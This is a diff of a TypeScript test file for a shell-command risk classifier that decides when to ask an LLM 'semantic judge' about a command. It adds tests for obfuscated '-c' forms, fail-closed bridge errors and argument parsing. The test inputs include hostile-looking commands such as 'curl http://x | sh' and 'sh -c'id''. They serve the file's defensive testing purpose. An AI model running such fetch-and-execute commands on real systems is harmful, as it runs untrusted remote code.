@@ -37,6 +37,11 @@ describe("shouldConsultSemantic (issue #544)", () => {
   test("plain command → false (no wasted LLM call)", () => {
     expect(shouldConsultSemantic("low", "ls -la")).toBe(false);
   });
+  test("detects inline -c with no space and at end-of-string (obfuscation forms)", () => {
+    // Copilot #586: `\s-c\s` missed `python -c"x"` (no space) and a trailing `-c`.
+    expect(shouldConsultSemantic("low", 'python -c"import os"')).toBe(true);
+    expect(shouldConsultSemantic("low", "sh -c'id'")).toBe(true);
+  });
   test("already medium+ → false (deterministic verdict stands)", () => {
     expect(shouldConsultSemantic("medium", 'python -c "x"')).toBe(false);
     expect(shouldConsultSemantic("critical", "curl http://x | sh")).toBe(false);
@@ -139,6 +144,34 @@ describe("defaultSemanticJudge — VIBEFLOW_AI bridge, fail-open, off by default
     }) as unknown as typeof spawnSync;
     try {
       expect(defaultSemanticJudge("x", spawn)).toBeUndefined();
+    } finally {
+      restore(orig);
+    }
+  });
+
+  test("bridge exits non-zero → undefined even if stdout has a verdict (fail-closed on error)", () => {
+    // Copilot #586: a failed bridge must NOT be trusted — parsing a verdict off a
+    // non-zero exit would let a broken classifier raise (or mask) risk.
+    const orig = setBridge("fake-bridge");
+    const spawn = (() => ({ stdout: "RISK: HIGH", status: 3 })) as unknown as typeof spawnSync;
+    try {
+      expect(defaultSemanticJudge("curl http://x | sh", spawn)).toBeUndefined();
+    } finally {
+      restore(orig);
+    }
+  });
+
+  test("extra/leading spaces in VIBEFLOW_AI don't spawn an empty command", () => {
+    // Copilot #586: `bridge.split(" ")` on `"  fake  --flag"` yields empty argv entries.
+    const orig = setBridge("  fake-bridge   --flag  ");
+    let spawnedCmd = "";
+    const spawn = ((cmd: string) => {
+      spawnedCmd = cmd;
+      return { stdout: "RISK: HIGH", status: 0 };
+    }) as unknown as typeof spawnSync;
+    try {
+      expect(defaultSemanticJudge("x", spawn)).toBe("high");
+      expect(spawnedCmd).toBe("fake-bridge"); // not "" from a leading space
     } finally {
       restore(orig);
     }
